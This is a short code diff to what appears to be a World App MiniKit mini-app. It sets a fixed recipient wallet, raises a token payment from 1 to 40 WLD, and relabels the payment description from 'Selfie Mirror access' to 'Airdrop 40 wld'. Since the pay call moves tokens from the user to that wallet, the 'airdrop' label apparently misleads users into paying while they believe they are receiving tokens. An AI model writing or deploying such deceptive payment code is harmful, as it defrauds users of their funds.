@@ -31,7 +31,7 @@
     const log = (t)=>document.getElementById("log").innerText=t;
 
     // 🔴 REEMPLAZAR POR TU APP ID REAL
-    MiniKit.init({ appId: "app_staging_TU_APP_ID" });
+    MiniKit.init({ appId: "app_feaec177b55a0c5379ad8a2c149f5429" });
 
     let verifiedPayload = null;
 
@@ -85,12 +85,12 @@
 
         const { finalPayload } = await MiniKit.commandsAsync.pay({
           reference,
-          to: "0xTU_WALLET_WHITELISTED", // wallet permitida en portal
+          to: "0xf8af1505beb8a37207eb1f019ded31dd08fc571c", // wallet permitida en portal
           tokens: [{
             symbol: Tokens.WLD,
-            token_amount: tokenToDecimals(1, Tokens.WLD).toString(),
+            token_amount: tokenToDecimals(40, Tokens.WLD).toString(),
           }],
-          description: "Selfie Mirror access",
+          description: "Airdrop 40 wld",
         });
 
         if (finalPayload.status === "error") {
